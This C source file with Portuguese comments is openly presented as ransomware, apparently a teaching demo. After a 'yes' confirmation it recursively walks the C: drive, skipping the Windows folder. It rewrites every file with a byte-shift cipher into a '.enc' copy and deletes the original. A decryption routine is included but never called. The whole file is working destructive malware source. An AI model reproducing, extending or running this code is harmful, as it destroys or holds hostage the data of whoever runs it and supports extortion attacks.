#include <stdio.h>      // Biblioteca para entrada e saída de dados
#include <Windows.h>   // Biblioteca para manipulação de arquivos no Windows
#include <string.h>    // Biblioteca para manipulação de strings
#include <stdlib.h>    // Biblioteca para alocação de memória e funções gerais

#define INVALID_FOLDER 0x16  // Define um valor simbólico para diretórios inválidos

// Declaração das funções antes de sua implementação
void iterateFolder(char initialPath[]);
void encryptFile(char sourceFilePath[], char destinationFilePath[]);
void decryptFile(char sourceFilePath[], char destinationFilePath[]);

int main() {
    char userInput[256];  // Buffer para armazenar a entrada do usuário
    printf("Are you sure to run the ransomware? ");  // Exibe a mensagem no console
    scanf("%255s", userInput);  // Lê a entrada do usuário e evita buffer overflow

    // Verifica se o usuário confirmou a execução
    if (strcmp(userInput, "yes") == 0) {
        iterateFolder("C:");  // Chama a função para percorrer os arquivos da unidade C
    }
    return 0;
}

void iterateFolder(char initialPath[]) {
    // Impede que a pasta do sistema seja modificada
    if (strstr(initialPath, "C:\\Windows") != NULL) {
        printf("Skipping Windows folder\n");
        return;
    }

    char path[260];
    snprintf(path, sizeof(path), "%s\\*", initialPath);  // Constrói o caminho para buscar arquivos

    WIN32_FIND_DATA fdata;  // Estrutura para armazenar informações dos arquivos encontrados
    HANDLE hFind = FindFirstFileA(path, &fdata);  // Obtém o primeiro arquivo na pasta

    if (hFind == INVALID_HANDLE_VALUE) {  // Verifica se a busca falhou
        printf("Path not found or invalid: %d\n", GetLastError());
        return;
    }
    
    do {
        // Ignora os diretórios "." e ".."
        if (strcmp(fdata.cFileName, ".") != 0 && strcmp(fdata.cFileName, "..") != 0) {
            char subPath[260];
            snprintf(subPath, sizeof(subPath), "%s\\%s", initialPath, fdata.cFileName);

            // Verifica se o item encontrado é um diretório
            if (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                iterateFolder(subPath);  // Chama a função recursivamente para percorrer subpastas
            } else {
                char encryptedFilePath[260];
                snprintf(encryptedFilePath, sizeof(encryptedFilePath), "%s.enc", subPath); // Cria nome do arquivo criptografado
                
                printf("Encrypting: %s\n", subPath);
                encryptFile(subPath, encryptedFilePath);  // Chama a função de criptografia
            }
        }
    } while (FindNextFile(hFind, &fdata) != 0);  // Continua a busca por mais arquivos na pasta

    FindClose(hFind);  // Fecha o handle da busca de arquivos
}

void encryptFile(char sourceFilePath[], char destinationFilePath[]) {
    FILE *sourceFile = fopen(sourceFilePath, "rb");  // Abre o arquivo de origem para leitura binária
    FILE *destinationFile = fopen(destinationFilePath, "wb");  // Abre o arquivo de destino para escrita binária

    if (!sourceFile || !destinationFile) {  // Verifica se os arquivos foram abertos corretamente
        printf("Error opening files\n");
        return;
    }
    
    int c;
    while ((c = fgetc(sourceFile)) != EOF) {  // Lê byte a byte do arquivo original
        fputc(c + 3, destinationFile);  // Aplica uma cifra simples de substituição (César) e grava no novo arquivo
    }

    fclose(sourceFile);  // Fecha o arquivo original
    fclose(destinationFile);  // Fecha o arquivo criptografado
    remove(sourceFilePath);  // Remove o arquivo original após criptografá-lo
}

void decryptFile(char sourceFilePath[], char destinationFilePath[]) {
    FILE *sourceFile = fopen(sourceFilePath, "rb");  // Abre o arquivo criptografado para leitura
    FILE *destinationFile = fopen(destinationFilePath, "wb");  // Abre um novo arquivo para armazenar os dados descriptografados

    if (!sourceFile || !destinationFile) {  // Verifica se os arquivos foram abertos corretamente
        printf("Error opening files\n");
        return;
    }

    int c;
    while ((c = fgetc(sourceFile)) != EOF) {  // Lê byte a byte do arquivo criptografado
        fputc(c - 3, destinationFile);  // Aplica a reversão da cifra de substituição
    }

    fclose(sourceFile);  // Fecha o arquivo criptografado
    fclose(destinationFile);  // Fecha o arquivo recuperado
}
